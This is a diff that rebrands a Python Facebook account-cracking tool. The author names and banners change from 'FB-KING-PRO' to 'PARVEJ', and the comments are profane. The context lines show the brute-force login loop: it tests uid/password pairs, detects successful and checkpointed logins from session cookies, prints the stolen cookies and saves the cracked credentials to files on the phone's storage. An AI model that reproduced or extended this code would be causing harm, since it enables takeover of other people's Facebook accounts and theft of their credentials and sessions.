@@ -1,7 +1,7 @@
-#SC MAKED BY FB-KING-PRO 
-#Fuck You
-#Dec By FB-KING-PRO 
-#FB-KING-PRO Your Reyal Pappa
+#SC MAKED BY PARVEJ
+#Fuck PARVEJ HOSSEN
+#Dec By PARVEJ
+#PARVEJ Your Reyal Pappa
 #PARVEJ Kids Numbar 5
 
 import os,sys,time,json,random,re,string,platform,base64,uuid
@@ -92,12 +92,12 @@ logo = ("""
 
 \033[1;92m══════════════════════════════════════════
 \033[1;32m[-] TOOLS TYPE:\033[1;32m PAID
-\033[1;32m[-] AUTHOR    :\033[1;32m FB-KING-PRO 
-\033[1;32m[-] GITHUB    :\033[1;32m m9woridking 
-\033[1;32m[-] FACEBOOK  :\033[1;32m FB-KING-PRO 
+\033[1;32m[-] AUTHOR    :\033[1;32m PARVEJ HOSSEN
+\033[1;32m[-] GITHUB    :\033[1;32m ROMAN-XXX
+\033[1;32m[-] FACEBOOK  :\033[1;32m FH Roman
 \033[1;92m══════════════════════════════════════════
 
-\033[1;91m<═══\033[1;41m\033[1;97m THIS NAME IS FB-KING-PRO \033[;0m\033[1;91m═══>\033[1;92m""")
+\033[1;91m<═══\033[1;41m\033[1;97m THIS NAME IS PARVEJ BRAND\033[;0m\033[1;91m═══>\033[1;92m""")
 
 
 class Main:
@@ -263,22 +263,22 @@ def rcrack1(uid,pwx,tl):
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[7:22]
-                print(f"\033[38;5;46m[FB-KING-PRO-OK 🌻] {uid}|{ps}")
+                print(f"\033[38;5;46m[PARVEJ-OK🌻] {uid}|{ps}")
                 print(f"\n[COOKIE🎁] : {coki}")
-                open('/sdcard/fb/ok.txt', 'a').write( uid+' | '+ps+'\n')
+                open('/sdcard/PARVEJ/ok.txt', 'a').write( uid+' | '+ps+'\n')
                 oks.append(uid)
                 break
             elif 'checkpoint' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[82:97]
-                print(f"\x1b[38;5;196m[FB-KING-PRO-CP❌] {uid}|{ps}")
+                print(f"\x1b[38;5;196m[PARVEJ-CP❌] {uid}|{ps}")
                 open('/sdcard/PARVEJ-CP.txt', 'a').write( uid+' | '+ps+' \n')
                 cps.append(uid)
                 break
             else:
                 continue
         loop+=1
-        sys.stdout.write(f'\r\033[m[FB-KING💥] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
+        sys.stdout.write(f'\r\033[m[PARVEJ-KING💥] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
         sys.stdout.flush()
     except:
         pass
